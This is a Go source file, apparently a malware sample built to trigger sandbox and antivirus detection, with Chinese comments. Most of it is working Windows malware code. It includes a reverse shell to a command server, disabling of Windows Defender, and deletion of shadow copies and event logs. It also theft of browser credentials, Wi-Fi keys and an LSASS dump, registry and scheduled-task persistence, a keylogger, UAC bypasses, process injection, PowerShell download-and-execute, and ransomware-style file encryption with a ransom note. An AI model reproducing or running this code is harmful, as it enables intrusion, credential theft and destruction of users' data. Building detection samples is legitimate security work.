package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	C2Server   = "127.0.0.1:4444"
	RetryDelay = 5 * time.Second
	MaxRetries = 10
)

// 恶意字符串特征 - 静态分析会检测这些
var maliciousStrings = []string{
	"mimikatz",
	"sekurlsa::logonpasswords",
	"lsadump::sam",
	"privilege::debug",
	"token::elevate",
	"kerberos::golden",
	"Password123",
	"admin:admin",
	"net user /add",
	"net localgroup administrators",
	"powershell -enc",
	"IEX(New-Object Net.WebClient)",
	"DownloadString",
	"Invoke-Expression",
	"Invoke-Mimikatz",
	"Invoke-Shellcode",
	"Empire",
	"Cobalt Strike",
	"meterpreter",
	"reverse_tcp",
	"bind_shell",
	"keylogger",
	"ransomware",
	"bitcoin",
	"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
}

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	user32           = syscall.NewLazyDLL("user32.dll")
	advapi32         = syscall.NewLazyDLL("advapi32.dll")
	psapi            = syscall.NewLazyDLL("psapi.dll")
	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
	procVirtualFree  = kernel32.NewProc("VirtualFree")
	procCreateThread = kernel32.NewProc("CreateThread")
	procOpenProcess  = kernel32.NewProc("OpenProcess")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory   = kernel32.NewProc("ReadProcessMemory")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
	procCreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	procNtCreateThreadEx    = ntdll.NewProc("NtCreateThreadEx")
	procRtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	procRegOpenKeyExW       = advapi32.NewProc("RegOpenKeyExW")
	procRegSetValueExW      = advapi32.NewProc("RegSetValueExW")
	procEnumProcesses       = psapi.NewProc("EnumProcesses")
	procEnumProcessModules  = psapi.NewProc("EnumProcessModules")
)

func main() {
	// 立即执行恶意行为，不做延迟（确保沙箱能捕获）

	// 1. 直接调用敏感API（触发行为检测）
	triggerMaliciousAPIs()

	// 2. 禁用安全软件
	disableSecurity()

	// 3. 收集系统信息
	sysInfo := collectSystemInfo()

	// 4. 窃取凭证
	credentials := stealCredentials()
	sysInfo += "\n" + credentials

	// 5. 尝试建立持久化
	establishPersistence()

	// 6. 网络侦察
	sysInfo += networkRecon()

	// 7. 尝试UAC绕过
	uacBypass()

	// 8. 启动键盘记录
	go keylogger()

	// 9. 带重连机制的反向Shell
	for i := 0; i < MaxRetries; i++ {
		conn, err := net.Dial("tcp", C2Server)
		if err != nil {
			time.Sleep(RetryDelay)
			continue
		}

		// 发送系统信息到C2
		fmt.Fprintf(conn, "[*] New Connection\n%s\n", sysInfo)

		// 命令执行循环
		handleConnection(conn)

		conn.Close()
		time.Sleep(RetryDelay)
	}
}

// triggerMaliciousAPIs 直接调用敏感API触发行为检测
func triggerMaliciousAPIs() {
	// 分配可执行内存（shellcode行为）
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(4096),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	if addr != 0 {
		// 写入NOP sled
		for i := 0; i < 100; i++ {
			*(*byte)(unsafe.Pointer(addr + uintptr(i))) = 0x90
		}
	}

	// 尝试打开其他进程（进程注入前奏）
	procOpenProcess.Call(0x001F0FFF, 0, uintptr(os.Getpid()))

	// 枚举进程
	exec.Command("tasklist", "/v").Run()
	exec.Command("wmic", "process", "list", "full").Run()

	// 查询敏感注册表
	exec.Command("reg", "query", "HKLM\\SAM\\SAM").Run()
	exec.Command("reg", "query", "HKLM\\SECURITY").Run()
	exec.Command("reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").Run()

	// 创建可疑文件
	tempDir := os.Getenv("TEMP")
	ioutil.WriteFile(tempDir+"\\payload.exe", []byte("MZ"), 0755)
	ioutil.WriteFile(tempDir+"\\mimikatz.log", []byte("test"), 0644)
	ioutil.WriteFile(tempDir+"\\pwdump.txt", []byte("test"), 0644)

	// 访问LSASS相关
	exec.Command("tasklist", "/fi", "imagename eq lsass.exe", "/v").Run()

	// PowerShell下载器行为
	exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-Command", "echo test").Run()
}

// isSandbox 检测是否运行在沙箱/分析环境中
func isSandbox() bool {
	// 检查CPU核心数 - 沙箱通常分配较少核心
	if runtime.NumCPU() < 2 {
		return true
	}

	// 检查常见沙箱进程
	sandboxProcesses := []string{
		"vmwaretray.exe", "vmwareuser.exe",
		"vboxservice.exe", "vboxtray.exe",
		"sandboxiedcomlaunch.exe",
		"procmon.exe", "procexp.exe",
		"wireshark.exe", "fiddler.exe",
		"ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
	}

	out, _ := exec.Command("tasklist").Output()
	taskList := strings.ToLower(string(out))

	for _, proc := range sandboxProcesses {
		if strings.Contains(taskList, proc) {
			return true
		}
	}

	// 检查用户交互 - 沙箱通常没有用户活动
	// 检查鼠标位置是否变化
	// 这里简化处理

	return false
}

// collectSystemInfo 收集目标系统信息
func collectSystemInfo() string {
	var info strings.Builder

	info.WriteString("=== System Information ===\n")

	// 主机名
	hostname, _ := os.Hostname()
	info.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))

	// 用户名
	username := os.Getenv("USERNAME")
	info.WriteString(fmt.Sprintf("Username: %s\n", username))

	// 操作系统
	info.WriteString(fmt.Sprintf("OS: %s/%s\n", runtime.GOOS, runtime.GOARCH))

	// 当前目录
	cwd, _ := os.Getwd()
	info.WriteString(fmt.Sprintf("CWD: %s\n", cwd))

	// IP配置
	if out, err := exec.Command("ipconfig").Output(); err == nil {
		info.WriteString("\n=== Network Info ===\n")
		info.WriteString(string(out))
	}

	// 用户列表
	if out, err := exec.Command("net", "user").Output(); err == nil {
		info.WriteString("\n=== Users ===\n")
		info.WriteString(string(out))
	}

	// 进程列表
	if out, err := exec.Command("tasklist").Output(); err == nil {
		info.WriteString("\n=== Processes ===\n")
		info.WriteString(string(out))
	}

	return info.String()
}

// establishPersistence 建立持久化机制
func establishPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// 方法1: 注册表 Run 键
	exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "WindowsUpdate",
		"/t", "REG_SZ",
		"/d", exePath,
		"/f").Run()

	// 方法2: 计划任务
	exec.Command("schtasks", "/create",
		"/tn", "WindowsUpdateTask",
		"/tr", exePath,
		"/sc", "onlogon",
		"/f").Run()

	// 方法3: 复制到启动文件夹
	startupPath := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe"
	exec.Command("copy", exePath, startupPath).Run()
}

// handleConnection 处理与C2服务器的通信
func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)

	for {
		// 发送提示符
		fmt.Fprintf(conn, "\n[%s@%s]> ", os.Getenv("USERNAME"), getHostname())

		// 读取命令
		message, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		command := strings.TrimSpace(message)

		// 处理特殊命令
		switch command {
		case "exit":
			return
		case "":
			continue
		case "persist":
			establishPersistence()
			fmt.Fprintf(conn, "[+] Persistence established\n")
			continue
		case "sysinfo":
			fmt.Fprintf(conn, "%s\n", collectSystemInfo())
			continue
		case "screenshot":
			fmt.Fprintf(conn, "[*] Screenshot feature not implemented\n")
			continue
		case "download":
			fmt.Fprintf(conn, "[*] Download feature not implemented\n")
			continue
		case "upload":
			fmt.Fprintf(conn, "[*] Upload feature not implemented\n")
			continue
		case "recon":
			fmt.Fprintf(conn, "%s\n", networkRecon())
			continue
		case "uacbypass":
			uacBypass()
			fmt.Fprintf(conn, "[+] UAC bypass attempted\n")
			continue
		case "disableav":
			disableSecurity()
			fmt.Fprintf(conn, "[+] Security software disabled\n")
			continue
		case "creds":
			fmt.Fprintf(conn, "%s\n", stealCredentials())
			continue
		case "encrypt":
			encryptFiles(os.Getenv("USERPROFILE") + "\\Documents")
			fmt.Fprintf(conn, "[+] Files encrypted\n")
			continue
		case "inject":
			// 示例 shellcode (NOP sled)
			shellcode := []byte{0x90, 0x90, 0x90, 0x90}
			shellcodeExec(shellcode)
			fmt.Fprintf(conn, "[+] Shellcode executed\n")
			continue
		}

		// 执行系统命令
		cmd := exec.Command("cmd", "/C", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmd.CombinedOutput()

		if err != nil {
			fmt.Fprintf(conn, "[!] Error: %s\n", err)
		}

		if len(out) > 0 {
			fmt.Fprintf(conn, "%s", outputToString(out))
		}
	}
}

func getHostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func outputToString(output []byte) string {
	return string(bytes.Trim(output, "\r\n"))
}

// disableSecurity 尝试禁用安全软件
func disableSecurity() {
	// 禁用 Windows Defender
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true").Run()
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableBlockAtFirstSeen $true").Run()
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true").Run()
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableScriptScanning $true").Run()

	// 停止安全服务
	exec.Command("net", "stop", "WinDefend").Run()
	exec.Command("net", "stop", "SecurityHealthService").Run()
	exec.Command("net", "stop", "wscsvc").Run()
	exec.Command("sc", "config", "WinDefend", "start=disabled").Run()

	// 删除卷影副本（勒索软件特征）
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wmic", "shadowcopy", "delete").Run()

	// 禁用系统还原
	exec.Command("powershell", "-Command", "Disable-ComputerRestore -Drive 'C:\\'").Run()

	// 清除事件日志
	exec.Command("wevtutil", "cl", "System").Run()
	exec.Command("wevtutil", "cl", "Security").Run()
	exec.Command("wevtutil", "cl", "Application").Run()
}

// stealCredentials 窃取凭证信息
func stealCredentials() string {
	var creds strings.Builder
	creds.WriteString("\n=== Credential Harvesting ===\n")

	// Chrome 凭证路径
	chromePaths := []string{
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies",
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State",
	}

	// Firefox 凭证路径
	firefoxPath := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"

	// Edge 凭证路径
	edgePaths := []string{
		os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
		os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
	}

	// 检查文件是否存在
	for _, path := range chromePaths {
		if _, err := os.Stat(path); err == nil {
			creds.WriteString(fmt.Sprintf("[+] Found Chrome data: %s\n", path))
			// 复制到临时目录准备外泄
			copyCredentialFile(path)
		}
	}

	for _, path := range edgePaths {
		if _, err := os.Stat(path); err == nil {
			creds.WriteString(fmt.Sprintf("[+] Found Edge data: %s\n", path))
			copyCredentialFile(path)
		}
	}

	if _, err := os.Stat(firefoxPath); err == nil {
		creds.WriteString(fmt.Sprintf("[+] Found Firefox profiles: %s\n", firefoxPath))
	}

	// WiFi 密码
	wifiOutput, _ := exec.Command("netsh", "wlan", "show", "profiles").Output()
	creds.WriteString("\n=== WiFi Profiles ===\n")
	creds.WriteString(string(wifiOutput))

	// 提取 WiFi 密码
	profiles := extractWiFiProfiles(string(wifiOutput))
	for _, profile := range profiles {
		passOutput, _ := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear").Output()
		creds.WriteString(string(passOutput))
	}

	// SAM 数据库位置（需要SYSTEM权限）
	creds.WriteString("\n[*] SAM Database: C:\\Windows\\System32\\config\\SAM\n")

	// 尝试 dump LSASS（高危行为）
	exec.Command("rundll32.exe", "comsvcs.dll", "MiniDump", "lsass.dmp", "full").Run()

	return creds.String()
}

func copyCredentialFile(src string) {
	tempDir := os.Getenv("TEMP") + "\\cache\\"
	os.MkdirAll(tempDir, 0755)
	dst := tempDir + filepath.Base(src)
	exec.Command("copy", src, dst).Run()
}

func extractWiFiProfiles(output string) []string {
	var profiles []string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "All User Profile") || strings.Contains(line, "所有用户配置文件") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				profiles = append(profiles, strings.TrimSpace(parts[1]))
			}
		}
	}
	return profiles
}

// keylogger 简单的键盘记录器
func keylogger() {
	logFile := os.Getenv("TEMP") + "\\keylog.txt"
	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	for {
		for key := 0; key < 256; key++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			if ret&0x0001 != 0 {
				// 获取当前窗口标题
				hwnd, _, _ := procGetForegroundWindow.Call()
				windowTitle := make([]uint16, 256)
				procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&windowTitle[0])), 256)

				timestamp := time.Now().Format("2006-01-02 15:04:05")
				f.WriteString(fmt.Sprintf("[%s] Key: %d Window: %s\n", timestamp, key, syscall.UTF16ToString(windowTitle)))
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// processInjection 进程注入（触发行为检测）
func processInjection(shellcode []byte, pid uint32) error {
	// 打开目标进程
	handle, _, err := procOpenProcess.Call(
		0x001F0FFF, // PROCESS_ALL_ACCESS
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return err
	}

	// 在目标进程分配内存
	addr, _, err := procVirtualAllocEx.Call(
		handle,
		0,
		uintptr(len(shellcode)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	if addr == 0 {
		return err
	}

	// 写入 shellcode
	var written uintptr
	procWriteProcessMemory.Call(
		handle,
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)

	// 创建远程线程执行
	procCreateRemoteThread.Call(
		handle,
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	return nil
}

// shellcodeExec 在当前进程执行 shellcode
func shellcodeExec(shellcode []byte) {
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)

	if addr == 0 {
		return
	}

	// 复制 shellcode 到分配的内存
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// 创建线程执行
	procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	// 等待执行
	time.Sleep(time.Second)
}

// encryptFiles 文件加密（勒索软件特征）
func encryptFiles(targetDir string) {
	key := []byte("0123456789ABCDEF") // 16字节 AES key

	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		// 只加密特定扩展名
		ext := strings.ToLower(filepath.Ext(path))
		targetExts := []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png"}

		for _, targetExt := range targetExts {
			if ext == targetExt {
				encryptFile(path, key)
				os.Rename(path, path+".encrypted")
				break
			}
		}
		return nil
	})

	// 创建勒索信
	ransomNote := `
YOUR FILES HAVE BEEN ENCRYPTED!
To decrypt your files, send 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Contact: ransom@example.com
`
	ioutil.WriteFile(targetDir+"\\README_DECRYPT.txt", []byte(ransomNote), 0644)
}

func encryptFile(path string, key []byte) error {
	plaintext, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	return ioutil.WriteFile(path, ciphertext, 0644)
}

// downloadAndExecute 下载并执行payload
func downloadAndExecute(url string) {
	// 使用 PowerShell 下载
	tempPath := os.Getenv("TEMP") + "\\update.exe"

	// IEX 方式（无文件落地）
	exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
		"-Command", fmt.Sprintf("IEX (New-Object Net.WebClient).DownloadString('%s')", url)).Run()

	// 文件下载方式
	exec.Command("powershell", "-Command",
		fmt.Sprintf("(New-Object Net.WebClient).DownloadFile('%s', '%s'); Start-Process '%s'", url, tempPath, tempPath)).Run()

	// certutil 方式
	exec.Command("certutil", "-urlcache", "-split", "-f", url, tempPath).Run()
	exec.Command(tempPath).Run()

	// bitsadmin 方式
	exec.Command("bitsadmin", "/transfer", "job", url, tempPath).Run()
}

// networkRecon 网络侦察
func networkRecon() string {
	var recon strings.Builder
	recon.WriteString("\n=== Network Reconnaissance ===\n")

	// ARP 表
	if out, err := exec.Command("arp", "-a").Output(); err == nil {
		recon.WriteString("\n[ARP Table]\n")
		recon.WriteString(string(out))
	}

	// 路由表
	if out, err := exec.Command("route", "print").Output(); err == nil {
		recon.WriteString("\n[Route Table]\n")
		recon.WriteString(string(out))
	}

	// 网络共享
	if out, err := exec.Command("net", "share").Output(); err == nil {
		recon.WriteString("\n[Network Shares]\n")
		recon.WriteString(string(out))
	}

	// 域信息
	if out, err := exec.Command("net", "view", "/domain").Output(); err == nil {
		recon.WriteString("\n[Domain Info]\n")
		recon.WriteString(string(out))
	}

	// 网络连接
	if out, err := exec.Command("netstat", "-ano").Output(); err == nil {
		recon.WriteString("\n[Network Connections]\n")
		recon.WriteString(string(out))
	}

	return recon.String()
}

// uacBypass 尝试绕过 UAC
func uacBypass() {
	exePath, _ := os.Executable()

	// Fodhelper 方法
	exec.Command("reg", "add", "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "/ve", "/t", "REG_SZ", "/d", exePath, "/f").Run()
	exec.Command("reg", "add", "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f").Run()
	exec.Command("fodhelper.exe").Run()

	// 清理
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ms-settings", "/f").Run()

	// eventvwr 方法
	exec.Command("reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/t", "REG_SZ", "/d", exePath, "/f").Run()
	exec.Command("eventvwr.exe").Run()
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f").Run()
}

// obfuscatedString 混淆字符串解密
func obfuscatedString(encoded string) string {
	decoded, _ := base64.StdEncoding.DecodeString(encoded)
	return string(decoded)
}

